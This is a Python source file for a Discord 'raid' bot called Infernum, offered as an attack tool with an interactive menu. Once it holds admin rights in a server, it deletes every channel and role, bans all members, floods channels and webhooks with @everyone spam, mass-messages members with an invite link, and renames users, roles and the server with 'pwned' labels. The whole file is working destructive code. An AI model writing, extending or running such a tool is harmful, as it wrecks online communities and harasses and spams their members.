import asyncio
import discord
import json
from colorama import Fore, Style, init
import time
import threading
from discord.ext import commands
import random
import os
init(convert=True, autoreset=True)

hora2 = time.strftime("[%H:%M:%S]")
hora = Fore.RED + time.strftime("[%H:%M:%S]") + Style.RESET_ALL

hora =  Fore.RED + time.strftime("[%H:%M:%S]") + Style.RESET_ALL
with open("config.json", "r") as e:
    config = json.load(e)

def print2(txt, vel=0.005):
    d = ['*', '#', '@', '!', '?', '$', '&', '%']
    for x in txt:
        print(x, end="", flush=True)
        time.sleep(vel)
        simbolo = random.choice(d)
        print(f"{simbolo}", end="", flush=True)
        time.sleep(vel)
        print('\b \b', end='', flush=True)
    print()
def input2(txt, vel=0.01):
    d = ['*', '#', '@', '!', '?']
    for x in txt:
        print(x, end="", flush=True)
        time.sleep(vel)
        simbolo = random.choice(d)
        print(f"{simbolo}", end="", flush=True)
        time.sleep(vel)
        print('\b \b', end='', flush=True)
    return input()

print2("<———————————————————————————————————————————————————————————>\n                   # I N F E R N U M \n<———————————————————————————————————————————————————————————>\n")
print2(txt="the best raid tool in discord.", vel=0.05)
print(f"{hora} Connecting the bot token to the API")

prefix = config['prefix']
token = config['token']

ct = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

def client():
    try:
        ct.start(token)
    except discord.LoginFailure:
        print("Token invalido")
        run()

@ct.event
async def on_webhooks_update(channel: discord.TextChannel):
    webhooks = await channel.webhooks()
    for x in webhooks:
        for _ in range(5):
            for _ in range(10):
                try:
                    await x.send(content="@everyone https://discord.gg/FxzFuaM5jQ")
                except Exception as e:
                    print(e)
        await asyncio.sleep(4)
@ct.event
async def on_ready():
    try:
        admin = [x for x in ct.guilds if x.me.guild_permissions.administrator]
        print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n")
        print(f"""                   {Fore.RED + 'Username: '} {Fore.GREEN + ct.user.name}
                   {Fore.RED + 'ID: '} {Fore.GREEN + str(ct.user.id)}
                   {Fore.RED + 'Type: '} {Fore.GREEN + 'Bot'}\n""")
        print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n")
        print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n")
        print(f"""                   {Fore.RED + 'Guilds with admin:'} {Fore.GREEN + str(len(admin))}\n""")
        print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n")
        print(f"""                   O P T I O N S:
                   {Fore.RED + '1. view admin guilds info.'}
                   {Fore.RED + '2. raid with guild id.'}
                   {Fore.RED + '3. exit program'}""")
        while True:
            try:
                selection = input2(f"{hora2} select option:  ")
                selection = int(selection)

                if selection == 1:
                    print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n")
                    for x in ct.guilds:
                        print(hora + f" {Fore.GREEN + x.name} {Fore.RED + str(x.id)} {Fore.GREEN + '->'} {Fore.RED + f'{str(x.member_count)} members.'}")
                    print(Fore.GREEN + "<———————————————————————————————————————————————————————————>\n\n")
                if selection == 2:
                    try:
                        guildid = input(f"{hora} {Fore.GREEN + 'set server id: '} ")
                        guildid = int(guildid)
                        guild = next((x for x in ct.guilds if x.id == guildid), None)
                        if guild is None:
                            print(hora + " Invalid Guild ID.")
                            continue
                    except ValueError:
                        print(hora + " Invalid Guild ID.")
                        continue
                    guild = ct.get_guild(guildid)
                    while True:
                        print(f"""{Fore.GREEN + '<———————————————————————————————————————————————————————————>'}

{Fore.GREEN + '                   Stablished conection with'}
{Fore.GREEN + f'                   {guild.name}'} {Fore.RED + str(guild.id)}
{Fore.GREEN + '                   successfully!'}\n\n
""") 
                        print(Fore.GREEN + "                   Select Option:\n")
                        print(Fore.RED + "                   1. change all channels name.                   8. delete all roles.")
                        print(Fore.RED + "                   2. delete all server channels.                 9. make new roles.")
                        print(Fore.RED + "                   3. spam channels with webhooks.                10. spam all dm users.")
                        print(Fore.RED + "                   4. change server appearance.                   11. change user names.")
                        print(Fore.RED + "                   5. make new channels.                          12. rename server roles.")
                        print(Fore.RED + "                   6. spam channels with bot.                     13. spam existents webhooks")
                        print(Fore.RED + "                   7. ban all server users.\n")
                        opti = input2(f"{hora2}  select option: ")
                        if int(opti) == 1:
                            try:
                                await bypass(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 2:
                            try:
                                await nuke(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 3:
                            try:
                                await webhooks(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 4:
                            try:
                                await rename(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 5:
                            try:
                                await channels(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 6:
                            try:
                               await spam(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 7:
                            try:
                                await banall(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 8:
                            try:
                                await delete_roles(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 9:
                            try:
                                await create_rles(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 10:
                            try:
                                await dmspam(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 11:
                            try:
                                await rename_users(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 12:
                            try:
                                await rename_roles(guildid)
                            except Exception as e:
                                print(e)
                                continue
                        if int(opti) == 13:
                            try:
                                await spam_webhooks(guildid)
                            except Exception as e:
                                print(e)
                                continue

                if selection == 3:
                    exit()
            except ValueError:
                print(hora + " Invalid selection.")

    except Exception as e:
        print(e)
        await on_ready

async def channels(guildid: int):
    guildid = int(guildid)
    guild = ct.get_guild(int(guildid))
    if guild is None:
        print2(Fore.RED + "[-] ERROR: El bot no esta en ese servidor.", Style.RESET_ALL)
        return
    if guild:
        t = []
        for x in range(50):
            t.append(guild.create_text_channel(name="pwned-by-infernum"))
        channel = await asyncio.gather(*t)
        for x in channel:
            print(f"{hora} -> channel created {x.id}")
    else:
        print2(Fore.RED + "[-] ERROR: El bot no esta en ese servidor.", Style.RESET_ALL)

async def webhooks(guildid):
    guild = ct.get_guild(guildid)
    async def create(canal: discord.TextChannel):
        await canal.create_webhook(name="@ifs on top")
    await asyncio.gather(*[create(channel) for channel in guild.text_channels])
    await asyncio.sleep(0.5)

async def bypass(guildid: int):
    guild = ct.get_guild(guildid)
    if guild:
        t = []
        for x in guild.channels:
            t.append(x.edit(name="bypassed-by-infernum"))
        channel = await asyncio.gather(*t)
        for x in channel:
            print(hora + f" -> action taken on channel {x.name}")
async def nuke(guildid: int):
    guild = ct.get_guild(guildid)
    if guild:
        t = []
        for x in guild.channels:
            t.append(x.delete(reason=""))
        channel = await asyncio.gather(*t)
        for x in channel:
            print(hora + f" -> channel deleted")
        await guild.create_text_channel(name="pwned-by-infernum")
async def rename(guildid: int):
    guild = ct.get_guild(guildid)
    if guild:
        with open("icon.jpg", "rb") as e:
            icn = e.read()
        with open("banner.gif", "rb") as e:
            bnnr = e.read()

        try:
            await guild.edit(name="Infernum pwned this shit - discord.gg/FxzFuaM5jQ", icon=icn)
            print(hora + f" -> action taken on guild {guild.id}")
            if guild.premium_tier == 2:
                await guild.edit(banner=bnnr)
                print(hora + f" -> action taken on guild {guild.id}")
        except Exception as e:
            print(e)

async def spam(guildid: int):
    try:
        guild = ct.get_guild(guildid)
        for _ in range(25):
            t = []
            for x in guild.text_channels:
                t.append(x.send(content="@everyone https://discord.gg/infernum"))
                print(hora + f" -> sended message on channel {x.id}")
            await asyncio.gather(*t)
            await asyncio.sleep(0.30)
    except Exception as e:
        print(e)
        pass
async def banall(guildid: int):
    guild = ct.get_guild(guildid)
    if guild:
        t = []
        for x in guild.members:
            t.append(x.ban(reason="Infernum pwned this shit - discord.gg/FxzFuaM5jQ"))
            print(hora + f" -> action taked on user {x.name}")
        await asyncio.gather(*t)
async def delete_roles(guildid: int):
    guild = ct.get_guild(guildid)
    if guild:
        t = []
        for x in guild.roles:
            if x.name != "@everyone" and "asd":
                await x.delete()
                print(hora + f" -> action taked on rol {x.id}")
                await asyncio.sleep(0.1)
async def create_rles(guildid: int):
    guild = ct.get_guild(guildid)
    t = []
    for _ in range(2):
        for _ in range(50):
            t.append(guild.create_role(name="Infernum pwned this shit - discord.gg/FxzFuaM5jQ", color=discord.Colour.random()))
        await asyncio.sleep(1)
    rol = await asyncio.gather(*t)
    for x in rol:
        print(hora + f" -> role created {x.id}")
async def dmspam(guildid: int):
    guild = ct.get_guild(guildid)
    for x in guild.members:
        t = []
        if x == ct.user:
            return
        dm = await x.create_dm()
        t.append(dm.send("join if you want raid a guild -> https://discord.gg/FxzFuaM5jQ"))
        print(hora + f" -> dm sended {x.id}")
        await asyncio.gather(*t)
async def rename_users(guildid: int):
    guild = ct.get_guild(guildid)
    t = []
    for x in guild.members:
        t.append(x.edit(nick="discord.gg/FxzFuaM5jQ"))    
        print(hora + f"-> action taked on user {x.id}")
    await asyncio.gather(*t)
async def rename_roles(guildid: int):
    guild = ct.get_guild(guildid)
    t = []
    for x in guild.roles:
        if x.name != "@everyone" and "asd":
            t.append(x.edit(name=" Discord.gg/FxzFuaM5jQ", color=discord.Colour.random(), reason="Infernum own this - discord.gg/FxzFuaM5jQ"))
            print(hora + f" -> action taken on role {x.id}")
    await asyncio.gather(*t)
async def spam_webhooks(guildid: int):
    t = []
    guild = ct.get_guild(guildid)
    webhooks = await guild.webhooks()
    for x in webhooks:
        for _ in range(5):
            for _ in range(10):
                try:
                    await x.send(content="@everyone https://discord.gg/FxzFuaM5jQ")
                except Exception as e:
                    print(e)
        await asyncio.sleep(4)

def run():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(ct.start(token))
if __name__ == "__main__":
    run()
